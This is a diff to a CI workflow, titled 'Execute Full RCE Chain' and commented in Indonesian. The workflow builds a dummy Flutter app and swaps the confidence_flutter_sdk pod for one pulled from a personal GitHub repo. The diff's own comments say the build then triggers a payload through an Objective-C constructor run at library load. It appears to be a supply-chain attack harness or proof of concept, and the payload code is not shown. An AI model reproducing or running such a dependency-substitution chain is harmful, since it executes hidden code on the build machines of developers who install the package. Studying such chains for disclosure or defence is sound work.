@@ -12,7 +12,10 @@ jobs:
 
       - name: Execute Full RCE Chain
         run: |
-          # 1. Create dummy project
+          # 0. NUCLEAR RESET: Hapus folder project lama biar gak ada cache zombie
+          rm -rf rce_test
+          
+          # 1. Create fresh dummy project
           flutter create rce_test
           cd rce_test
           flutter pub add confidence_flutter_sdk
@@ -21,37 +24,37 @@ jobs:
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
           
           # 3. DIRECT GIT BYPASS (The Guerilla Route)
-          # Hapus logic otomatis Flutter agar tidak terkunci ke symlink lokal (:path)
+          # Bunuh logic otomatis Flutter agar tidak terkunci ke symlink lokal
           sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
           
-          # Kita paksa CocoaPods narik langsung dari GitHub Repo lu dengan tag 2.0.0
-          # Ini nge-bypass CDN CocoaPods Trunk yang lagi sinkronisasi
+          # PAKSA ambil dari branch main. Bodo amat sama CDN Trunk yang lemot!
           echo "pod 'confidence_flutter_sdk', :git => 'https://github.com/ilhamal7/confidence-sdk-flutter.git', :branch => 'main'" >> ios/Podfile
           
           echo "=== Podfile AFTER Guerilla Patch (Direct Git) ==="
           cat ios/Podfile
           
           cd ios
-          
-          # === CLEANUP PROTOCOL ===
+          # 4. CLEANUP PROTOCOL
           echo "=== Purging Old Pods and Locks ==="
+          pod cache clean --all
           rm -rf Pods
           rm -rf Podfile.lock
           
-          # 4. Pod Install - Resolution Phase
-          # Karena ini nembak langsung ke Git, dia bakal download v2.0.0 secara instan
+          # Jalankan install secara verbose untuk debugging
           pod install --verbose 2>&1 | tee pod_install.log || true
           
           echo "=== Check Podfile.lock Status ==="
+          # Jika gagal di sini, cek pod_install.log untuk error spesifik dari CocoaPods
+          ls -la Podfile.lock || echo "Podfile.lock STILL MISSING - CHECK LOGS ABOVE"
           grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "FAILED TO RESOLVE 2.0.0"
           
           cd ..
           # 5. Build Phase - Execution Phase (Trigger Payload)
-          # dyld akan load library dan mentrigger Objective-C constructor di v2.0.0
+          # dyld akan load library dan mentrigger Objective-C constructor lu
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
           echo "=== Build log tail ==="
-          tail -20 build.log
+          tail -30 build.log
 
       - name: Upload Logs
         if: always()
